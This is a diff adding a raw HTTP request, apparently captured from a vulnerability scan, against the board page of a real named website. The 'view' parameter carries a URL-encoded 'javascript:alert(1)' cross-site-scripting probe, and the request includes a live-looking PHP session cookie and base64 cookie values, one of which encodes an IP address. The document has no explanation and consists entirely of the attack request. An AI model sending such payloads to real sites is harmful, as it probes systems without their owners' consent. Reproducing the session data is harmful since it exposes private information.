@@ -1,0 +1,9 @@
+GET https://www.kims.re.kr/Board/bbs/new.php?gr_id=&mb_id=&page=19&view=javascript%3Aalert%281%29%3B HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 0
+Referer: https://www.kims.re.kr/Board/bbs/new.php
+Cookie: PHPSESSID=prgi20bt1dldn0rr7n5uvo37e5; 2a0d2363701f23f8a75028924a3af643=MjEwLjExOS4xMTQuMjE%3D; 3cdd7a9cf69f036e38207467f8ed0082=MDZfMDhfMDRfMDI%3D; 96b28b766b7e0699aa91c9ff3d890663=aHR0cHM6Ly93d3cua2ltcy5yZS5rcg%3D%3D; 7572559ca86e781ba8fe8073a0b725c6=ZW4%3D; f33d2ed86bd82d4c22123c9da444d8ab=MTU4NjEzMzM1OA%3D%3D; e1192aefb64683cc97abb83c71057733=dGZfMDVfMDE%3D
+Host: www.kims.re.kr
+
